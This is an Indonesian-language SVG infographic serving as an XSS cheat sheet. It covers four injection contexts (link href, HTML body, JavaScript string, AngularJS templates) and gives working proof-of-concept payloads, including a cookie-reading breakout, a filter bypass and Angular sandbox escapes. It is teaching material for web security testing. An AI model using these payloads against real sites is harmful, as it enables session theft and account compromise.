<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" height="100%">
  <defs>
    <!-- Background Gradient -->
    <linearGradient id="bgGrad3" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#090D16"/>
      <stop offset="50%" stop-color="#0F172A"/>
      <stop offset="100%" stop-color="#090D16"/>
    </linearGradient>

    <!-- Card Backgrounds -->
    <linearGradient id="cardGrad3" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1E293B" stop-opacity="0.95"/>
      <stop offset="100%" stop-color="#0F172A" stop-opacity="0.95"/>
    </linearGradient>

    <!-- Shadow -->
    <filter id="cardShadow3" x="-10%" y="-10%" width="120%" height="125%">
      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000000" flood-opacity="0.5"/>
    </filter>

    <!-- Glows -->
    <filter id="glowBlue" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowYellow" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowGreen" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowRed" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
  </defs>

  <style>
    .title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 800; fill: #F8FAFC; }
    .subtitle { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 500; fill: #94A3B8; }
    .card-title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 700; }
    .code-text { font-family: 'JetBrains Mono', monospace; font-size: 10px; font-weight: 600; }
    .desc-text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 11.5px; fill: #CBD5E1; }
    .badge { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 10px; font-weight: 700; }
  </style>

  <!-- Base Canvas -->
  <rect width="1080" height="560" rx="16" fill="url(#bgGrad3)"/>
  <rect width="1080" height="560" rx="16" fill="none" stroke="#334155" stroke-width="1.5" stroke-opacity="0.6"/>

  <!-- Header -->
  <g transform="translate(48, 40)">
    <rect x="0" y="0" width="140" height="24" rx="12" fill="#E11D48" fill-opacity="0.15" stroke="#E11D48" stroke-width="1"/>
    <text x="70" y="16" text-anchor="middle" class="badge" fill="#FB7185">XSS CHEATSHEET</text>
    <text x="155" y="18" class="title" font-size="20">Cross-Site Scripting (XSS): 4 Konteks &amp; Vektor Injeksi</text>
    <text x="0" y="42" class="subtitle" font-size="13">Eksplorasi Link Pseudo-protocol, Image Error Handlers, Page Script Breakout, dan Template Injection AngularJS</text>
  </g>

  <!-- ==================== CARD 1: A LINK VECTOR ==================== -->
  <g transform="translate(48, 115)" filter="url(#cardShadow3)">
    <rect width="230" height="405" rx="12" fill="url(#cardGrad3)" stroke="#38BDF8" stroke-width="1.5"/>
    <text x="18" y="32" class="card-title" font-size="14" fill="#38BDF8">1. Tag Link (&lt;a&gt; href)</text>
    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Pseudo-Protocol Scheme</text>
    <line x1="18" y1="60" x2="212" y2="60" stroke="#334155" stroke-width="1"/>

    <!-- Context Box -->
    <rect x="14" y="70" width="202" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
    <text x="22" y="88" class="badge" fill="#7DD3FC">KONTEKS ATRIBUT HREF:</text>
    <text x="22" y="106" class="code-text" fill="#CBD5E1">&lt;a href="<tspan fill="#38BDF8">USER_INPUT</tspan>"&gt;</text>
    <text x="22" y="122" class="desc-text" font-size="10.5">Input masuk ke URL link</text>
    <text x="22" y="136" class="desc-text" font-size="10.5">tanpa validasi protokol.</text>

    <!-- Payload Box -->
    <rect x="14" y="155" width="202" height="150" rx="6" fill="#0F172A" stroke="#0284C7" stroke-width="1"/>
    <text x="22" y="175" class="badge" fill="#38BDF8">PAYLOAD INJEKSI:</text>
    
    <rect x="20" y="185" width="190" height="42" rx="4" fill="#0C4A6E" stroke="#38BDF8" stroke-width="1"/>
    <text x="24" y="200" class="code-text" font-size="9" fill="#E0F2FE">javascript:alert(</text>
    <text x="24" y="214" class="code-text" font-size="9" fill="#FDA4AF">document.domain)</text>

    <text x="22" y="244" class="desc-text" font-size="10.5">Alternatif Data URI:</text>
    <text x="22" y="260" class="code-text" font-size="8.5" fill="#FDE047">data:text/html,&lt;script&gt;...</text>
    <text x="22" y="280" class="desc-text" font-size="10.5">Bypass http:// filter:</text>
    <text x="22" y="296" class="code-text" font-size="8.5" fill="#34D399">javascript:alert(1)//https://</text>

    <!-- Status -->
    <rect x="14" y="318" width="202" height="70" rx="6" fill="#0284C7" fill-opacity="0.1" stroke="#0284C7" stroke-width="1"/>
    <text x="22" y="338" class="badge" fill="#7DD3FC">⚡ TRIGGER EKSEKUSI:</text>
    <text x="22" y="356" class="desc-text" font-size="10.5">JavaScript dieksekusi</text>
    <text x="22" y="372" class="desc-text" font-size="10.5">saat user mengklik tautan!</text>
  </g>

  <!-- ==================== CARD 2: IMAGE TAG VECTOR ==================== -->
  <g transform="translate(294, 115)" filter="url(#cardShadow3)">
    <rect width="230" height="405" rx="12" fill="url(#cardGrad3)" stroke="#10B981" stroke-width="1.5"/>
    <text x="18" y="32" class="card-title" font-size="14" fill="#6EE7B7">2. Tag Gambar (&lt;img&gt;)</text>
    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Auto-Execute Error Event</text>
    <line x1="18" y1="60" x2="212" y2="60" stroke="#334155" stroke-width="1"/>

    <!-- Context Box -->
    <rect x="14" y="70" width="202" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
    <text x="22" y="88" class="badge" fill="#6EE7B7">KONTEKS HTML BODY:</text>
    <text x="22" y="106" class="code-text" fill="#CBD5E1">&lt;div&gt;<tspan fill="#34D399">USER_INPUT</tspan>&lt;/div&gt;</text>
    <text x="22" y="122" class="desc-text" font-size="10.5">Input di-render langsung</text>
    <text x="22" y="136" class="desc-text" font-size="10.5">sebagai elemen HTML.</text>

    <!-- Payload Box -->
    <rect x="14" y="155" width="202" height="150" rx="6" fill="#0F172A" stroke="#047857" stroke-width="1"/>
    <text x="22" y="175" class="badge" fill="#34D399">PAYLOAD INJEKSI:</text>
    
    <rect x="20" y="185" width="190" height="42" rx="4" fill="#064E3B" stroke="#10B981" stroke-width="1"/>
    <text x="24" y="200" class="code-text" font-size="8.5" fill="#ECFDF5">&lt;img src=x</text>
    <text x="24" y="214" class="code-text" font-size="8.5" fill="#FDE047"> onerror="alert(1)"&gt;</text>

    <text x="22" y="244" class="desc-text" font-size="10.5">Varian SVG Tanpa Spasi:</text>
    <text x="22" y="260" class="code-text" font-size="8.5" fill="#A7F3D0">&lt;svg/onload=alert(1)&gt;</text>
    <text x="22" y="280" class="desc-text" font-size="10.5">Varian Animasi SVG:</text>
    <text x="22" y="296" class="code-text" font-size="8.5" fill="#A7F3D0">&lt;svg&gt;&lt;animate onbegin=...&gt;</text>

    <!-- Status -->
    <rect x="14" y="318" width="202" height="70" rx="6" fill="#047857" fill-opacity="0.1" stroke="#10B981" stroke-width="1"/>
    <text x="22" y="338" class="badge" fill="#A7F3D0">⚡ 0-CLICK EXPLOIT:</text>
    <text x="22" y="356" class="desc-text" font-size="10.5">Otomatis jalan saat gambar</text>
    <text x="22" y="372" class="desc-text" font-size="10.5">gagal di-load oleh browser!</text>
  </g>

  <!-- ==================== CARD 3: PAGE SCRIPT VECTOR ==================== -->
  <g transform="translate(540, 115)" filter="url(#cardShadow3)">
    <rect width="240" height="405" rx="12" fill="url(#cardGrad3)" stroke="#F59E0B" stroke-width="1.5"/>
    <text x="18" y="32" class="card-title" font-size="14" fill="#FBBF24">3. Page Script Breakout</text>
    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Injeksi di Dalam &lt;script&gt;</text>
    <line x1="18" y1="60" x2="222" y2="60" stroke="#334155" stroke-width="1"/>

    <!-- Context Box -->
    <rect x="14" y="70" width="212" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
    <text x="22" y="88" class="badge" fill="#FDE047">KONTEKS VARIABLE JS:</text>
    <text x="22" y="106" class="code-text" fill="#CBD5E1">let query = '<tspan fill="#F59E0B">USER_INPUT</tspan>';</text>
    <text x="22" y="122" class="desc-text" font-size="10.5">Input dimasukkan ke dalam</text>
    <text x="22" y="136" class="desc-text" font-size="10.5">string JavaScript server.</text>

    <!-- Payload Box -->
    <rect x="14" y="155" width="212" height="150" rx="6" fill="#0F172A" stroke="#D97706" stroke-width="1"/>
    <text x="22" y="175" class="badge" fill="#FBBF24">PAYLOAD INJEKSI:</text>
    
    <rect x="20" y="185" width="200" height="42" rx="4" fill="#451A03" stroke="#F59E0B" stroke-width="1"/>
    <text x="24" y="200" class="code-text" font-size="9" fill="#FEF08A">';alert(document.</text>
    <text x="24" y="214" class="code-text" font-size="9" fill="#FDA4AF">cookie)//</text>

    <text x="22" y="244" class="desc-text" font-size="10.5">Tutup Tag Script:</text>
    <text x="22" y="260" class="code-text" font-size="8.5" fill="#FDE68A">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</text>
    <text x="22" y="280" class="desc-text" font-size="10.5">Template Literal Breakout:</text>
    <text x="22" y="296" class="code-text" font-size="8.5" fill="#FDE68A">${alert(1)}</text>

    <!-- Status -->
    <rect x="14" y="318" width="212" height="70" rx="6" fill="#D97706" fill-opacity="0.1" stroke="#F59E0B" stroke-width="1"/>
    <text x="22" y="338" class="badge" fill="#FDE68A">⚡ SINK BREAKOUT:</text>
    <text x="22" y="356" class="desc-text" font-size="10.5">Memutus string asli dan</text>
    <text x="22" y="372" class="desc-text" font-size="10.5">menjalankan fungsi payload.</text>
  </g>

  <!-- ==================== CARD 4: ANGULARJS APP ==================== -->
  <g transform="translate(796, 115)" filter="url(#cardShadow3)">
    <rect width="236" height="405" rx="12" fill="url(#cardGrad3)" stroke="#E11D48" stroke-width="1.5"/>
    <text x="18" y="32" class="card-title" font-size="14" fill="#FDA4AF">4. AngularJS App (CSTI)</text>
    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Client-Side Template Injection</text>
    <line x1="18" y1="60" x2="218" y2="60" stroke="#334155" stroke-width="1"/>

    <!-- Context Box -->
    <rect x="14" y="70" width="208" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
    <text x="22" y="88" class="badge" fill="#FDA4AF">ANGULAR DIRECTIVE:</text>
    <text x="22" y="106" class="code-text" fill="#CBD5E1">&lt;body <tspan fill="#F43F5E">ng-app</tspan>&gt;</text>
    <text x="22" y="122" class="desc-text" font-size="10.5">Input berada di lingkup</text>
    <text x="22" y="136" class="desc-text" font-size="10.5">kompilasi template Angular.</text>

    <!-- Payload Box -->
    <rect x="14" y="155" width="208" height="150" rx="6" fill="#0F172A" stroke="#E11D48" stroke-width="1"/>
    <text x="22" y="175" class="badge" fill="#FDA4AF">SANDBOX BYPASS PAYLOAD:</text>
    
    <rect x="20" y="185" width="196" height="42" rx="4" fill="#4C0519" stroke="#F43F5E" stroke-width="1"/>
    <text x="24" y="198" class="code-text" font-size="8" fill="#FFF1F2">{{constructor.constructor</text>
    <text x="24" y="212" class="code-text" font-size="8" fill="#FDE047">('alert(1)')()}}</text>

    <text x="22" y="244" class="desc-text" font-size="10.5">Varian $on constructor:</text>
    <text x="22" y="260" class="code-text" font-size="8" fill="#FECDD3">{{$on.constructor('alert(1)')()}}</text>
    <text x="22" y="280" class="desc-text" font-size="10.5">AngularJS Event Vector:</text>
    <text x="22" y="296" class="code-text" font-size="7.5" fill="#FECDD3">&lt;input ng-focus="$event..."&gt;</text>

    <!-- Status -->
    <rect x="14" y="318" width="208" height="70" rx="6" fill="#E11D48" fill-opacity="0.1" stroke="#F43F5E" stroke-width="1"/>
    <text x="22" y="338" class="badge" fill="#FECDD3">⚡ SANDBOX ESCAPE:</text>
    <text x="22" y="356" class="desc-text" font-size="10.5">Angular mengevaluasi {{ }}</text>
    <text x="22" y="372" class="desc-text" font-size="10.5">dan mengeksekusi payload!</text>
  </g>

</svg>
